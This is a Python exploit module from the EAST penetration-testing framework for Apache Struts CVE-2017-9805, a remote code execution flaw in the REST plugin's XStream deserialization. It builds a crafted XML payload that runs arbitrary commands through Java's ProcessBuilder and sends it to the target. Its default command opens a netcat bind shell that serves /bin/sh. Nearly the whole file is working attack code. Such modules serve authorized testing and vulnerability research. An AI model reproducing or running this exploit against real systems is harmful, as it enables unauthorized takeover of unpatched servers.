#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import urllib2

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_apache_struts_rce"
INFO['DESCRIPTION'] = "Apache Struts 2.5 < 2.5.12 - REST Plugin XStream Remote Code Execution"
INFO['VENDOR'] = "https://struts.apache.org/"
INFO['DOWNLOAD_LINK'] = 'http://mirror.nbtelecom.com.br/apache/struts/2.5.10/struts-2.5.10-all.zip'
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/42627/']
INFO["CVE Name"] = "CVE-2017-9805"
INFO["NOTES"] = """Successfully exploiting this issue may allow an attacker to execute arbitrary code in the context of the affected application. Failed exploit attempts will likely result in denial-of-service conditions.

Apache Struts 2.5 through 2.5.12 are vulnerable. 
"""

INFO['CHANGELOG'] = "08 Sep, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = 80, dict(description = 'Target port')
OPTIONS["COMMAND"] = '/usr/bin/nc -l -p 9999 -e /bin/sh', dict(description = 'Command')

class exploit(Sploit):
    def __init__(self, host="", port=0, logger=None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.command = ""
    
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.command = self.args.get('COMMAND', self.command)
        
    
    def make_url(self, path = ''):
        return 'http://{}:{}{}'.format(self.host, self.port, path)
    
    def make_data(self, command):
        xml = '''
<map>
    <entry>
        <jdk.nashorn.internal.objects.NativeString>
            <flags>0</flags>
            <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
                <dataHandler>
                    <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                        <is class="javax.crypto.CipherInputStream">
                            <cipher class="javax.crypto.NullCipher">
                                <initialized>false</initialized>
                                <opmode>0</opmode>
                                <serviceIterator class="javax.imageio.spi.FilterIterator">
                                    <iter class="javax.imageio.spi.FilterIterator">
                                        <iter class="java.util.Collections$EmptyIterator"/>
                                        <next class="java.lang.ProcessBuilder">
                                            <command>{}</command>
                                            <redirectErrorStream>false</redirectErrorStream>
                                        </next>
                                    </iter>
                                    <filter class="javax.imageio.ImageIO$ContainsFilter">
                                        <method>
                                            <class>java.lang.ProcessBuilder</class>
                                            <name>start</name>
                                            <parameter-types/>
                                        </method>
                                        <name>foo</name>
                                    </filter>
                                    <next class="string">foo</next>
                                </serviceIterator>
                                <lock/>
                            </cipher>
                            <input class="java.lang.ProcessBuilder$NullInputStream"/>
                            <ibuffer/>
                            <done>false</done>
                            <ostart>0</ostart>
                            <ofinish>0</ofinish>
                            <closed>false</closed>
                        </is>
                        <consumed>false</consumed>
                    </dataSource>
                    <transferFlavors/>
                </dataHandler>
                <dataLen>0</dataLen>
            </value>
        </jdk.nashorn.internal.objects.NativeString>
        <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
    </entry>
    <entry>
        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    </entry>
</map>
'''
        
        commands = command.split()
        string_commands = ''
        for item in commands:
            string_commands += '<string>{}</string>'.format(item)
            
        return xml.format(string_commands)
    
    def run(self):
        self.args()
        
        data = self.make_data(self.command)
        url = self.make_url('/struts2-rest-showcase/orders/3')
        
        request = urllib2.Request(url, data, headers={'Content-Type':'application/xml'})
        self.log('[+] Trying to exploit Apache Struts running at address: ' + self.make_url())
        try:
            fd = urllib2.urlopen(request)
            self.log(fd.read())
        except Exception as e:
            self.log(e)
            self.finish(False)
        self.finish(False)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()